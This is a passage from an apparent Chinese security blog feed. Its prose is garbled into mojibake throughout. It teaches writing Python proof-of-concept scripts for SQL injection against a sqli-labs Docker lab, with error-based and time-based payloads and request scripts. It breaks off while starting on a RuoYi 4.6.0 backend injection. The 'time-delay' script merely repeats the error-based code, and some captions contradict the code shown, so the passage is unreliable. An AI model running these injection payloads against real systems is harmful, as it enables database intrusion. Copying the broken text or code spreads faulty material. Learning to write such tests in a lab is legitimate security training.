class="string">&quot;Nacos&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="ğŸ›ï¸-FQA"><a href="#ğŸ›ï¸-FQA" class="headerlink" title="ğŸ›ï¸ FQA"></a>ğŸ›ï¸ FQA</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1ã€åç»­åŠ å¼ºå¯¹ç°æœ‰æŒ‡çº¹çš„é€‚é…ä»¥åŠä¸å®šæœŸæ›´æ–°è‡ªæ”¶é›†çš„æŒ‡çº¹</span><br><span class="line">2ã€bugåé¦ˆï¼šhttps://github.com/Funsiooo/chunsou/issues</span><br><span class="line">3ã€ä½¿ç”¨æ—¶æ³¨æ„ç½‘ç»œé—®é¢˜ï¼Œç”±äºéƒ¨åˆ†ç½‘ç«™é˜²ç«å¢™æˆ–å…¶ä»–ç­–ç•¥åŸå› ä½¿ç”¨ç§‘å­¦ç½‘ç»œæˆ–ç½‘ç»œä¸ç¨³å®šä¼šå¯¼è‡´éƒ¨åˆ†æ‰«ææŠ¥é”™å¼‚å¸¸</span><br><span class="line">4ã€å·¥å…·æ›´æ–°è¯¦æƒ…å¯æŸ¥çœ‹log.md</span><br><span class="line">5ã€æŒ‡çº¹ä¸å®šæœŸæ›´æ–°ï¼Œæœ€æ–°æŒ‡çº¹è¯·ä¸‹è½½ modules/config/finger.json æ–‡ä»¶è‡ªè¡Œæ›¿æ¢</span><br></pre></td></tr></table></figure></div><h2 id="â­-Star-History"><a href="#â­-Star-History" class="headerlink" title="â­ Star History"></a>â­ Star History</h2><p><a href="https://star-history.com/#Funsiooo/chunsou&Date"><a data-fancybox="gallery" data-src="https://api.star-history.com/svg?repos=Funsiooo/chunsou&type=Date" data-caption="Star History Chart"><img src="https://api.star-history.com/svg?repos=Funsiooo/chunsou&type=Date" alt="Star History Chart"></a></a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŒ‡çº¹è¯†åˆ« </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Pocç¼–å†™å®ä¾‹ï¼šä»åŸç†åˆ°å®è·µ</title>
      <link href="/2023/05/22/Python%20Poc%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B%EF%BC%9A%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E8%B7%B5/"/>
      <url>/2023/05/22/Python%20Poc%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B%EF%BC%9A%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>POCï¼ˆProof of Conceptï¼Œæ¦‚å¿µéªŒè¯ï¼‰æŒ‡ä¸ºäº†éªŒè¯æŸä¸ªæ½œåœ¨çš„æ¼æ´æˆ–å®‰å…¨é—®é¢˜è€Œç¼–å†™çš„è„šæœ¬ã€‚æœ¬æ–‡ä¸»è¦ä»‹ç»å…³äºæ¼æ´éªŒè¯ Python PoC  çš„ç¼–å†™å®ä¾‹å’Œç®€å•çš„ç¼–å†™æ€è·¯ï¼Œå¹¶æŒ‘é€‰å‡ ç§ç±»å‹çš„æ¼æ´è¿›è¡Œäº† Poc å®ä¾‹ç¼–å†™å’Œæµ‹è¯•éªŒè¯,ä»£ç ç¼–å†™éš¾åº¦ç›¸å¯¹è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ˜¯ç›¸å…³åº“çš„è¿ç”¨åŠç®€å•çš„æ€è·¯æ˜¯å®ç°ã€‚</p><h2 id="äºŒã€SQLæ³¨å…¥"><a href="#äºŒã€SQLæ³¨å…¥" class="headerlink" title="äºŒã€SQLæ³¨å…¥"></a>äºŒã€SQLæ³¨å…¥</h2><p>æœ¬èŠ‚ â€œåŸºç¡€å­¦ä¹ â€ å°èŠ‚ä¸­ä¸»è¦é€šè¿‡æ­å»º sali-lab æ¼æ´ç¯å¢ƒè¿›è¡Œç®€å•çš„å®ä¾‹ç¼–å†™ï¼Œç”¨äºåˆæ­¥äº†è§£ GET ä¸ POST æ³¨å…¥è„šæœ¬ç¼–å†™çš„åŒºåˆ«ï¼Œç”±ç®€å•çš„ç¯å¢ƒå¼€å§‹é€æ¸è¿‡æ¸¡åˆ°å®Œæ•´çš„ Poc ç¼–å†™ã€‚</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è¿™è¾¹åˆ©ç”¨ docker æ­å»º sqli-lab æ¼æ´ç¯å¢ƒï¼Œå‘½ä»¤å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docekr search sqli-lab</span><br><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line">docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs</span><br></pre></td></tr></table></figure></div><p>è®¿é—®æœ¬åœ° 80 ç«¯å£ï¼Œç‚¹å‡» <code>Setup/reset Database for labs</code> åå®Œæˆå®‰è£…</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230505210826702.png" data-caption="image-20230505210826702"><img src="/../images/poc/image-20230505210826702.png" alt="image-20230505210826702"></a></p><h3 id="åŸºç¡€å­¦ä¹ "><a href="#åŸºç¡€å­¦ä¹ " class="headerlink" title="åŸºç¡€å­¦ä¹ "></a>åŸºç¡€å­¦ä¹ </h3><p><strong>1ã€å•å¼•å·æŠ¥é”™æ³¨å…¥ï¼ˆGETï¼‰</strong>ï¼ŒGET å‹å•å¼•å·æ³¨å…¥åˆ©ç”¨ Less-1 è¿›è¡Œ Poc ä»£ç ç¼–å†™å­¦ä¹ </p><p>æ­£å¸¸é¡µé¢</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230505211525289.png" data-caption="image-20230505211525289"><img src="/../images/poc/image-20230505211525289.png" alt="image-20230505211525289"></a></p><p>å•å¼•å· SQL è¯­å¥æŠ¥é”™</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230505211553674.png" data-caption="image-20230505211553674"><img src="/../images/poc/image-20230505211553674.png" alt="image-20230505211553674"></a></p><p>ç»æµ‹è¯•å‘ç°å­˜åœ¨ SQL æ³¨å…¥ï¼Œå¯é€šè¿‡æ’å…¥ Payload æŸ¥è¯¢å¹¶åœ¨é¡µé¢ä¸Šå›æ˜¾æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼Œå…·ä½“ Payload å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;</span>utgs<span class="string">&#x27;=&#x27;</span>utgs</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230505220510216.png" data-caption="image-20230505220510216"><img src="/../images/poc/image-20230505220510216.png" alt="image-20230505220510216"></a></p><p><strong>Poc ç®€å•ç¼–å†™</strong></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šSingle_quotes_error_based_injection.py.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥ requests åº“</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰‹åŠ¨è®¾ç½®æ¼æ´é“¾æ¥</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155/Less-1/?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® headers å¤´ï¼Œå‘Šè¯‰æœåŠ¡å™¨è¯·æ±‚çš„å®¢æˆ·ç«¯æ˜¯ä»€ä¹ˆç±»å‹çš„è®¾å¤‡æˆ–åº”ç”¨ç¨‹åºï¼Œæœ‰äº›æœåŠ¡å™¨å¯èƒ½ä¼šæ ¹æ®User-Agentå­—æ®µæ¥åšç‰¹å®šçš„å¤„ç†ï¼Œä¾‹å¦‚æ ¹æ®è®¾å¤‡ç±»å‹è¿”å›ä¸åŒçš„å†…å®¹æˆ–åº”ç”¨ä¸åŒçš„é™åˆ¶ç­–ç•¥ï¼Œé¿å…è¢« ban</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€  SQL è¯­å¥ï¼ŒæŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬</span></span><br><span class="line">payload = <span class="string">&quot;&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;utgs&#x27;=&#x27;utgs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€HTTPè¯·æ±‚ï¼Œæ³¨å…¥ payload å¹¶è·å–é¡µé¢å“åº”</span></span><br><span class="line">res = requests.get(url + payload,  headers=headers, timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‹¥ res è¿”å›çš„å“åº”ä¸­å­˜åœ¨ &quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot; åˆ™è¯æ˜å­˜åœ¨æ¼æ´ï¼Œå¦åˆ™ä¸å­˜åœ¨</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]Vulnerable to SQL injection: &#x27;</span> + url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Not Vulnerable: &#x27;</span> + url)</span><br></pre></td></tr></table></figure></div><p>å½“å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿”å› <code>[+] Vulnerable to SQL injection: + url</code> å“åº”</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522134019340.png" data-caption="image-20230522134019340"><img src="/../images/poc/image-20230522134019340.png" alt="image-20230522134019340"></a></p><p>å½“ä¸å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿”å› <code>[+] Not Vulnerable : + url</code>  å“åº”</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522134053028.png" data-caption="image-20230522134053028"><img src="/../images/poc/image-20230522134053028.png" alt="image-20230522134053028"></a></p><p><strong>2ã€å•å¼•å·æŠ¥é”™æ³¨å…¥ï¼ˆPOSTï¼‰</strong>ï¼ŒPOST å‹å•å¼•å·æ³¨å…¥åˆ©ç”¨ Less-11 è¿›è¡Œ Poc ä»£ç ç¼–å†™å­¦ä¹ </p><p>æ­£å¸¸é¡µé¢</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230508134427501.png" data-caption="image-20230508134427501"><img src="/../images/poc/image-20230508134427501.png" alt="image-20230508134427501"></a></p><p> é€šè¿‡æŠ“åŒ…åˆ†æï¼Œå‚æ•° <code>username</code>ã€<code>password</code> å‡å­˜åœ¨å•å¼•å·æŠ¥é”™æ³¨å…¥</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230508135018385.png" data-caption="image-20230508135018385"><img src="/../images/poc/image-20230508135018385.png" alt="image-20230508135018385"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230508135056209.png" data-caption="image-20230508135056209"><img src="/../images/poc/image-20230508135056209.png" alt="image-20230508135056209"></a></p><p>ç»è¿‡æµ‹è¯•åï¼Œç¡®å®šå…¶æ•°æ®åº“ç‰ˆæœ¬ï¼Œå…·ä½“ payload ä¸º</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;</span>utgs<span class="string">&#x27;=&#x27;</span>utgs</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230508134932111.png" data-caption="image-20230508134932111"><img src="/../images/poc/image-20230508134932111.png" alt="image-20230508134932111"></a></p><p><strong>Poc ç®€å•ç¼–å†™</strong></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼špost_sql_injection.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥ requests åº“</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰‹åŠ¨è®¾ç½®æ¼æ´é“¾æ¥</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155/Less-12/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® headers å¤´ï¼Œå‘Šè¯‰æœåŠ¡å™¨è¯·æ±‚çš„å®¢æˆ·ç«¯æ˜¯ä»€ä¹ˆç±»å‹çš„è®¾å¤‡æˆ–åº”ç”¨ç¨‹åºï¼Œæœ‰äº›æœåŠ¡å™¨å¯èƒ½ä¼šæ ¹æ®User-Agentå­—æ®µæ¥åšç‰¹å®šçš„å¤„ç†ï¼Œä¾‹å¦‚æ ¹æ®è®¾å¤‡ç±»å‹è¿”å›ä¸åŒçš„å†…å®¹æˆ–åº”ç”¨ä¸åŒçš„é™åˆ¶ç­–ç•¥ï¼Œé¿å…è¢« ban</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€  POST æ•°æ®åŒ…ï¼Œå¹¶åˆ›å»º SQL è¯­å¥ï¼ŒæŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ï¼ŒéªŒè¯æ¼æ´</span></span><br><span class="line">payload = &#123;<span class="string">&quot;uname&quot;</span>: <span class="string">&quot;&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;utgs&#x27;=&#x27;utgs&quot;</span>,</span><br><span class="line">           <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€ HTTP POST è¯·æ±‚ï¼Œæ³¨å…¥ payload å¹¶è·å–é¡µé¢å“åº”ï¼ŒåŒ¹é…ç›¸åº”å­—æ®µåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥</span></span><br><span class="line">res = requests.post(url, headers = headers, data = payload, timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‹¥ res è¿”å›çš„å“åº”ä¸­å­˜åœ¨ &quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot; åˆ™è¯æ˜å­˜åœ¨æ¼æ´ï¼Œå¦åˆ™ä¸å­˜åœ¨</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Vulnerable to SQL injection: &#x27;</span> + url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Not Vulnerable: &#x27;</span> + url)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>å½“å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿”å› <code>[+] Vulnerable to SQL injection: + url</code> å“åº”</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522134601141.png" data-caption="image-20230522134601141"><img src="/../images/poc/image-20230522134601141.png" alt="image-20230522134601141"></a></p><p>å½“ä¸å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿”å› <code>[+] Vulnerable to SQL injection: + url</code> å“åº”</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522134717406.png" data-caption="image-20230522134717406"><img src="/../images/poc/image-20230522134717406.png" alt="image-20230522134717406"></a></p><p><strong>3ã€å•å¼•å·å»¶æ—¶æ³¨å…¥ï¼ˆPOSTï¼‰</strong>ï¼ŒPOST å‹å•å¼•å·å»¶æ—¶æ³¨å…¥åˆ©ç”¨ Less-15 è¿›è¡Œ Poc ä»£ç ç¼–å†™å­¦ä¹ </p><p>æ­£å¸¸é¡µé¢</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230509213505706.png" data-caption="image-20230509213505706"><img src="/../images/poc/image-20230509213505706.png" alt="image-20230509213505706"></a></p><p>é€šè¿‡æŠ“åŒ…ç¡®å®šå…¶å­˜åœ¨ sql å»¶æ—¶æ³¨å…¥ï¼Œç»è¿‡æµ‹è¯•åç¡®è®¤å…¶ payload ä¸º</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT 2707 FROM (SELECT(SLEEP(5)))vWgP) AND &#x27;</span>xDGW<span class="string">&#x27;=&#x27;</span>xDGW</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230509213645889.png" data-caption="image-20230509213645889"><img src="/../images/poc/image-20230509213645889.png" alt="image-20230509213645889"></a></p><p><strong>Poc ç®€å•ç¼–å†™</strong></p><p>æœ¬æ¬¡å»¶æ—¶æ³¨å…¥ Poc ç¼–å†™ä¸»è¦å¤šäº† time åº“ï¼Œåˆ©ç”¨ time åº“è·å–å…¶è¯·æ±‚æ—¶é—´ä¸ç»“æŸçš„å“åº”æ—¶é—´ï¼Œé€šè¿‡æ—¶é—´çš„å“åº”æ—¶é•¿ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨å»¶æ—¶æ³¨å…¥</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼špost_sql_injection.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥ requests åº“</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰‹åŠ¨è®¾ç½®æ¼æ´é“¾æ¥</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155/Less-12/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® headers å¤´ï¼Œå‘Šè¯‰æœåŠ¡å™¨è¯·æ±‚çš„å®¢æˆ·ç«¯æ˜¯ä»€ä¹ˆç±»å‹çš„è®¾å¤‡æˆ–åº”ç”¨ç¨‹åºï¼Œæœ‰äº›æœåŠ¡å™¨å¯èƒ½ä¼šæ ¹æ®User-Agentå­—æ®µæ¥åšç‰¹å®šçš„å¤„ç†ï¼Œä¾‹å¦‚æ ¹æ®è®¾å¤‡ç±»å‹è¿”å›ä¸åŒçš„å†…å®¹æˆ–åº”ç”¨ä¸åŒçš„é™åˆ¶ç­–ç•¥ï¼Œé¿å…è¢« ban</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€  POST æ•°æ®åŒ…ï¼Œå¹¶åˆ›å»º SQL è¯­å¥ï¼ŒæŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ï¼ŒéªŒè¯æ¼æ´</span></span><br><span class="line">payload = &#123;<span class="string">&quot;uname&quot;</span>: <span class="string">&quot;&#x27; AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND &#x27;utgs&#x27;=&#x27;utgs&quot;</span>,</span><br><span class="line">           <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€ HTTP POST è¯·æ±‚ï¼Œæ³¨å…¥ payload å¹¶è·å–é¡µé¢å“åº”ï¼ŒåŒ¹é…ç›¸åº”å­—æ®µåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥</span></span><br><span class="line">res = requests.post(url, headers = headers, data = payload, timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‹¥ res è¿”å›çš„å“åº”ä¸­å­˜åœ¨ &quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot; åˆ™è¯æ˜å­˜åœ¨æ¼æ´ï¼Œå¦åˆ™ä¸å­˜åœ¨</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;XPATH syntax error: &#x27;~5.5.44-0ubuntu0.14.04.1~&#x27;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Vulnerable to SQL injection: &#x27;</span> + url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Not Vulnerable: &#x27;</span> + url)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>éªŒè¯å­˜åœ¨æ¼æ´ï¼Œå½“å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿”å› <code>[+] Vulnerable to SQL injection </code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522135150483.png" data-caption="image-20230522135150483"><img src="/../images/poc/image-20230522135150483.png" alt="image-20230522135150483"></a></p><p>å½“ä¸å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿”å› <code>[+] Not Vulnerable to SQL injection </code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522135225310.png" data-caption="image-20230522135225310"><img src="/../images/poc/image-20230522135225310.png" alt="image-20230522135225310"></a></p><h3 id="è‹¥ä¾-v-4-6-0-åå°-SQL-æ³¨å…¥"><a href="#è‹¥ä¾-v-4-6-0-åå°-SQL-æ³¨å…¥" class="headerlink" title="è‹¥ä¾ v 4.6.0 åå° SQL æ³¨å…¥"></a>è‹¥ä¾ v 4.6.0 åå° SQL æ³¨å…¥</h3><p>é€šè¿‡ä¸Šé¢çš„åŸºç¡€çš„å­¦ä¹ ï¼Œåˆæ­¥äº†è§£äº† Poc ç¼–å†™çš„ç®€å•å®ç°ï¼Œè¿™è¾¹åˆ©ç”¨ <code>è‹¥ä¾åå°æ³¨å…¥</code>å®ä¾‹ç»§ç»­å­¦ä¹  Poc çš„ç¼–å†™ï¼Œç¯å¢ƒæ­å»ºä»¥åŠç›¸å…³æ¼æ´ä»£ç åˆ†æè¿™é‡Œä¸èµ˜è¿°ï¼Œè‹¥æœ‰éœ€æ±‚ï¼Œå¯å‚è€ƒä¸ªäºº blog æ–‡ç«   <a href="https://funsiooo.github.io/2023/03/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AD)-%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV4-6-0/">Javaä»£ç å®¡è®¡(å…­)-è‹¥ä¾ç®¡ç†ç³»ç»ŸV4.6.0</a></p><blockquote><p>å½±å“ç‰ˆæœ¬ï¼šRuoYi &lt;&#x3D;4.6.1</p></blockquote><h4 id="POC-ä»£ç ç¼–å†™åˆ†æ"><a href="#POC-ä»£ç ç¼–å†™åˆ†æ" class="headerlink" title="POC ä»£ç ç¼–å†™åˆ†æ"></a>POC ä»£ç ç¼–å†™åˆ†æ</h4><p>åœ¨æ­£å¼å¼€å§‹ç¼–å†™ Poc æ—¶ï¼Œéœ€å……åˆ†åˆ†æè¯¥æ¼æ´çš„ç‰¹ç‚¹ï¼Œä»¥åŠ Poc ç¼–å†™è¿‡ç¨‹ä¸­éœ€è¦è§£å†³çš„éš¾ç‚¹ï¼Œä¸€ä¸€åˆ—å‡ºæ¥ï¼Œç„¶åé€ç‚¹å‡»ç ´ï¼Œè¯¥æœç´¢æœç´¢ï¼Œè¯¥æ‰¾èµ„æ–™æ‰¾èµ„æ–™ï¼Œè¯¥é—®äººå°±å¾—é—®äººï¼Œå…ˆç®€å•èƒ½å®ç°æ¼æ´éªŒè¯åŠŸèƒ½åå†å»å®Œå–„æ ¼å¼ï¼Œç¾åŒ–ä»£ç ã€‚</p><p>1ã€æ¼æ´ä½ç½®åœ¨ç™»å½•åå°åï¼Œè§’è‰²ç®¡ç†å¤„æŠ“åŒ…åæ·»åŠ  <code>params[dataScope]</code>å‚æ•°ï¼Œæ¼æ´å…·ä½“é“¾æ¥ <a href="http://192.168.148.184:8888/system/role/list">http://192.168.148.184:8888/system/role/list</a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230510203321621.png" data-caption="image-20230510203321621"><img src="/../images/poc/image-20230510203321621.png" alt="image-20230510203321621"></a></p><p>åˆ©ç”¨ Burp æŠ“åˆ°çš„åŸå§‹æ•°æ®åŒ…ä¿¡æ¯</p><p><a data-fancybox="gallery" 